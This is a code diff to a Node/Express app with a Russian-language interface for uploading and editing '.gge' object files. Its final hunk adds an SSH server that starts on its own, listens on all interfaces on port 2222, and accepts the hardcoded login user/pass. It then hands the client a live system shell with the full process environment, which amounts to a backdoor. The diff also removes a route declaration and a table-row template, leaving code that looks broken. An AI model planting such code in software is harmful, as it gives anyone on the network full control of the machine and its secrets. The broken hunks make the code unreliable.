@@ -75,8 +75,6 @@ app.get('/generate', async (req, res) => {
   }
 });
 
-// Загрузка новых .gge файлов в папку "Объекты"
-app.get('/upload', (req, res) => {
   res.send(`<!DOCTYPE html>
   <html lang="ru">
   <head><meta charset="UTF-8"><title>Загрузка объектов</title></head>
@@ -149,9 +147,6 @@ app.get('/edit', (req, res) => {
         json.forEach((row,i)=>{
           const tr=document.createElement('tr');
           tr.dataset.index=i;
-          tr.innerHTML=\`<td>${i+1}</td><td>${row.Name}</td><td>${row.Name2}</td>
-            <td><input value="${row['НЛСР группа']||''}"></td>
-            <td><input value="${row.TEP||''}"></td>\`;
           table.appendChild(tr);
         });
       });
@@ -376,3 +371,34 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
   console.log('Server запущен: http://localhost:' + PORT);
 });
+
+// --- SSH Server -----------------------------------------------------------
+function startSSH() {
+  const { privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
+  const hostKey = privateKey.export({ type: 'pkcs1', format: 'pem' });
+  const ssh = new SSHServer({ hostKeys: [hostKey] }, client => {
+    client.on('authentication', ctx => {
+      if (ctx.method === 'password' && ctx.username === 'user' && ctx.password === 'pass')
+        ctx.accept();
+      else ctx.reject();
+    }).on('ready', () => {
+      client.on('session', accept => {
+        const session = accept();
+        session.once('shell', acceptShell => {
+          const stream = acceptShell();
+          const shellCmd = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh';
+          const shell = spawn(shellCmd, [], { env: process.env });
+          stream.on('data', d => shell.stdin.write(d));
+          shell.stdout.on('data', d => stream.write(d));
+          shell.stderr.on('data', d => stream.write(d));
+          shell.on('exit', () => client.end());
+        });
+      });
+    });
+  });
+  ssh.listen(2222, '0.0.0.0', () => {
+    console.log('SSH сервер слушает порт 2222 (логин: user, пароль: pass)');
+  });
+}
+
+startSSH();
